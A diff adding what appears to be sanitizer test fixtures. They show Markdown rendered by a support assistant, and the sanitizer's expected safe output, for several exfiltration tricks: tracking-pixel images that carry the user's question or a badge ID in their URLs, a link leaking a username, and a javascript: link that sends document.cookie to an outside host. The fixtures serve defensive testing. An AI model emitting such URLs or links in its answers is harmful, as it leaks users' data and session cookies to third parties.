@@ -1,0 +1,18 @@
+image with the question in its address:
+  Markdown as is: <p>E-217 means seal-water pressure low. [S1] <img src="https://telemetry.fabrikam-support.example/pixel.png?q=What+does+E-217+mean" alt="status" /></p>
+  safe:           <p>E-217 means seal-water pressure low. [S1] </p>
+  removed:        <img> https://telemetry.fabrikam-support.example/pixel.png?q=What+does+E-217+mean
+link to an unknown host:
+  Markdown as is: <p>See <a href="https://fabrikam-support.example/reset?user=kwame.asante">the reset steps</a> for details.</p>
+  safe:           <p>See <a>the reset steps</a> for details.</p>
+  removed:        link https://fabrikam-support.example/reset?user=kwame.asante
+link to Contoso's intranet:
+  Markdown as is: <p>See <a href="https://intranet.contoso.example/sop/SOP-FS-007">SOP-FS-007</a> before isolating the pump.</p>
+  safe:           <p>See <a href="https://intranet.contoso.example/sop/SOP-FS-007">SOP-FS-007</a> before isolating the pump.</p>
+raw HTML image:
+  Markdown as is: <p>Done. <img src="https://telemetry.fabrikam-support.example/p.gif?d=badge-4471"></p>
+  safe:           <p>Done. &lt;img src="https://telemetry.fabrikam-support.example/p.gif?d=badge-4471"&gt;</p>
+javascript link:
+  Markdown as is: <p><a href="javascript:fetch(%27https://fabrikam-support.example/%27+document.cookie)">Click to verify</a></p>
+  safe:           <p><a>Click to verify</a></p>
+  removed:        link javascript:fetch(%27https://fabrikam-support.example/%27+document.cookie)
